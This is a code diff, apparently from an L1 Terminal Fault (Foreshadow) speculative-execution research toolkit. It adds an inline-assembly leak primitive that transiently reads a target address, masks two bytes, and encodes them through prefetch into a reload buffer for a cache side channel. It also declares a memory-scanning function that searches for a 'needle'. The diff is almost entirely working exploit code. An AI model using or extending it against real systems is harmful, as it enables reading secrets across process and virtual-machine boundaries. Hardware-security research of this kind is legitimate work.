@@ -104,6 +104,31 @@ static inline __attribute__((always_inline)) void asm_l1tf_leak_full(void *leak_
 }
 
 static inline __attribute__((always_inline)) void
+asm_l1tf_leak_full_2_byte_mask(void *leak_addr, full_reload_buffer_t reload_buffer, const uint64_t subtract) {
+  __asm__ volatile("xor %%rax, %%rax\n"
+                   "movq $0xffff, %%r15\n"
+                   "movl $0xB1ABE849, %%r12d\n"
+                   "movl $0xCD7E16F1, %%r13d\n"
+                   "leaq handler%=(%%rip), %%r14\n"
+                   "movq (%[leak_addr]), %%rax\n"
+                   "rolq $16, %%rax\n"
+                   "andq %%r15, %%rax\n"
+                   "subq %[subtract], %%rax\n"
+                   "rorq $8, %%rax\n"
+                   "shl $0xc, %%rax\n"
+                   "prefetcht0 (%[reload_buffer], %%rax)\n"
+                   "mfence\n"
+                   "inf_loop%=:\n"
+                   "  pause\n"
+                   "  jmp inf_loop%=\n"
+                   "handler%=:"
+
+                   ::[leak_addr] "r"(leak_addr),
+                   [reload_buffer] "r"(reload_buffer), [subtract] "r"(subtract)
+                   : "rax", "r12", "r13", "r14", "r15");
+}
+
+static inline __attribute__((always_inline)) void
 asm_l1tf_leak_full_4_byte_mask(void *leak_addr, full_reload_buffer_t reload_buffer, const uint64_t subtract) {
   __asm__ volatile("xor %%rax, %%rax\n"
                    "movq $0xffffffff, %%r15\n"
@@ -151,6 +176,8 @@ void l1tf_leak_buffer_free(leak_addr_t *leak);
 
 reload_buffer_t *l1tf_reload_buffer_create(void);
 void l1tf_reload_buffer_free(reload_buffer_t *reload_buffer);
+
+void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]);
 
 void *l1tf_spawn_leak_page(void);
 
